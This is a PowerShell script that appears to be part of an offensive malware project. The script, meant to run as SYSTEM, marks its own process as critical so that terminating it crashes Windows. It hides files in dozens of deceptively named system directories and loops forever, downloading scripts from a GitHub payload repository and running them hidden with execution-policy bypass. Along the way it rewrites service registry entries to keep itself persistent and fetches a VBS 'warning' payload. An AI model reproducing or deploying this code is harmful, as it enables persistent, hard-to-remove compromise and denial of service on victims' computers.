#script must run as admin/SYSTEM
param(
    [string]$rootPath,
    [string]$basePath,
    [string]$childServiceName,
    [string]$childServicePropertyName,
    [string]$parentServicePropertyName
)
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]


$paths =  @(
    "$env:windir\system32\config\systemprofile\AppData\Local","$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta","$env:windir\Microsoft.NET\assembly\GAC_MSIL\PolicyCache\v4.0_Subscription\en-US\Resources\Temp","$env:windir\Microsoft.NET\assembly\GAC_64\PolicyCache\v4.0_Subscription\en\Temp\ShadowCopy","$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload", "$env:windir\Resources\Themes\Cursors\Backup\MicrosoftStore","$env:windir\System32\Tasks\Microsoft\Windows\PLA\System\Diagnostics\ETL\Traces\Archived","$env:windir\System32\DriverStore\FileRepository\netrndis-inf_amd64_abcd1234efgh5678\ConfigBackup",($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),($env:systemdrive + "\Recovery"),"$env:ProgramData\Microsoft\WindowsDefender\Platform\Config\MpEngine\Quarantine\Volatile","$env:ProgramData\Microsoft\EdgeCore\modules\stable_winupdate_aux\cache\media_metrics\prefetch","$env:ProgramData\Microsoft\Windows\AppRepository\StateCache\CacheIndex\Staging\DriverStore","$env:ProgramData\Microsoft\Edge\DevTools\HeapSnapshots\Cache\IndexedDB\dump","$env:ProgramData\Microsoft\Diagnosis\DownloadedSettings\Symbols\Public\CrashDump","$env:windir\system32\spool\drivers\x64\3\en-US","$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls","$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642","$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces","$env:windir\WinSxS\amd64_netfx4-fusion-dll-b03f5f7f11d50a3a_4015840_none_19b5d9c7ab39bf74\microsoft\windows\servicingstack\Temp\Symbols\Debug","$env:windir\WinSxS\Manifests\x86_microsoft_windows_servicingstack_31bf3856ad364e35\Backup\Analytics\Cache","$env:windir\WinSxS\Catalogs\Index\Staging\DriverCache\ShadowCopy\Microsoft\Windows\Tasks\Services\Minidump","$env:windir\WinSxS\Manifests\amd64_abcdef0123456789_manifest\microsoft\windows\ProgramCache\ShadowCopy\Universal\Debug\Logs","$env:windir\WinSxS\Manifests\wow64_microsoft-windows-ability-assistant-db-31bf3856ad364e35_10_0_19041_4597_none_c873f8fba7f2e1a5\ProgramData\Ammnune\Acids\Backups\Logs\Recovery\SelectedFiles","$env:windir\WinSxS\Temp\Microsoft\Windows\Logs\Dump\CrashReports","$env:windir\WinSxS\ManifestCache\x86_netfx35linq_fusion_dll_b03f5f7f11d50a3a_4015840_cache","$env:windir\WinSxS\ManifestCache\x86_microsoft-windows_servicingstack_31bf3856ad364e35_100190413636_none_9ab8d1c1a1a8a1f0\ServiceStack\Programs\Updates","$env:windir\WinSxS\ManifestCache\amd64_microsoft-windows-aence-mitigations-c1_31bf3856ad364e35-100226212506_none_9a1f2d8e1d4c3f07","$env:windir\WinSxS\ManifestCache\x86_microsoft-windows-sgstack-servicingapi_31bf3856ad364e35_100190413636_none_0c8e1a1d3d0b0a1f","$env:windir\WinSxS\Backup\KB5034441_amd64_1234567890abcdef","$env:windir\WinSxS\Backup\wow64_microsoft-windows-ued-telemetry-client_31bf3856ad364e35_100226212506_none_1b3f8c7f1a9d0d42","$env:windir\WinSxS\Backup\amd64_netfx4-mscordacwks_b03f5f7f11d50a3a_4015744161_none_1a2b3c4d5e6f7d89","$env:windir\WinSxS\Backup\x86_presentationcore_31bf3856ad364e35_61760117514_none_49d7b7f5b8f0b0d5","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Logs\Backup\Temp","$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\Caches\CRMDatabase\Index"
)

$mutexName = "Global\MyUniquePrion"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)

$signature = @"
using System;
using System.Runtime.InteropServices;

public class CS {
    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
"@
Add-Type -TypeDefinition $signature
[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

if($basePath -eq "" -or $childServiceName -eq "" -or $childServicePropertyName -eq ""){
    $mutex.WaitOne()
    try {
        if(-not(Test-Path -Path "$env:temp\598600304.txt" -PathType Leaf)){
            $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $pa = "$pa\async_fun.vbs"
            iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
            wscript.exe $pa
            New-Item -Path "$env:temp\598600304.txt" -ItemType File -Force
        }
    }
    finally {
        $mutex.ReleaseMutex()
        exit
    }
}

$b = $basePath -replace '([\\{}])', '`$1'
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$childServiceName"

$parentPath = ""


$item = Get-ItemProperty -Path "$basePath" -Name $childServicePropertyName -ErrorAction SilentlyContinue
$canUpdateRootPath = $false

if((($rootPath -eq $null) -or ($rootPath -eq "")) -and -not($item)){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
    New-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $rootPath -Force | Out-Null
    $canUpdateRootPath = $true
}

if (-not($item)) {
    New-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $rootPath -Force | Out-Null
    $canUpdateRootPath = $false
}

else{
    $rootPath = $item.$childServicePropertyName
    $canUpdateRootPath = $true
}

$item2 = Get-ItemProperty -Path "$basePath" -Name $parentServicePropertyName -ErrorAction SilentlyContinue
if($item2){
    $parentPath = $item2.$parentServicePropertyName
}

$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$initServicePath = $paths[$idx]
$initServicePath = "$initServicePath\init_service_root.ps1"

function Check-ServiceReg{
    param([string]$path)
    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Check-Service{
    param([string]$name)
    try {
        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}

while ($true) {
    $regS = Check-ServiceReg -path $regPath
    $serv = Check-Service -name $childServiceName

    if(-not(Test-Path -Path $rootPath -PathType Leaf)){
        if($canUpdateRootPath){
            $idx = Get-Random -Minimum 0 -Maximum $paths.Length
            $initServicePath = $paths[$idx]
            $initServicePath = "$initServicePath\init_service_root.ps1"
            $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $rootPath = "$rootPath\root.ps1"
            Set-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $rootPath -Force | Out-Null
        }
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
    }
    
    elseif($regS -or $serv){
        $idx = Get-Random -Minimum 0 -Maximum $paths.Length
        $initServicePath = $paths[$idx]
        $initServicePath = "$initServicePath\init_service_root.ps1"
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath -basePath "$b"
    }
    $canUpdateRootPath=$true

    if(-not(Test-Path -Path $parentPath -PathType Leaf)){
        $initParentServicePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $initParentServicePath = "$initParentServicePath\init_service_rootmonmon.ps1"
        $parentPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $parentPath = "$parentPath\root_mon_mon.ps1"
        Set-ItemProperty -Path "$basePath" -Name $parentServicePropertyName -Value $parentPath -Force | Out-Null
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1" -OutFile $initParentServicePath
        powershell.exe -ep bypass -noP -w hidden $initParentServicePath -rootPath $rootPath -basePath "$b"
    }
    
    Start-Sleep -Seconds 2
}